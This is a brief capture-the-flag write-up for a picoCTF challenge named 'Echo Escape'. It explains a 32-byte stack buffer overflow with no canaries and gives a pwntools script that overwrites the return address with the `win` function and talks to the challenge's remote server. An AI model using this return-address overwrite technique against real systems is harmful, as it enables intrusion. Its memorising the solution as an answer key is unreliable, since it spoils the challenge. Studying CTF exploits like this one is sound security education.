# Echo Escape

## Solution
The program reads back a given input to the user. It reads 128 bytes into a 32 byte buffer, providing a buffer overflow vulnerability. No protections such as stack canaries are present.
Thus, all that needs to be done is overflow the buffer and jump to `win`.

## Script
```py
from pwn import *

exe = ELF("./vuln")

p = remote("mysterious-sea.picoctf.net", 65190)
#p = process("./vuln")

p.send(b'a'*40 + p64(exe.symbols['win']+1))

p.interactive()
```
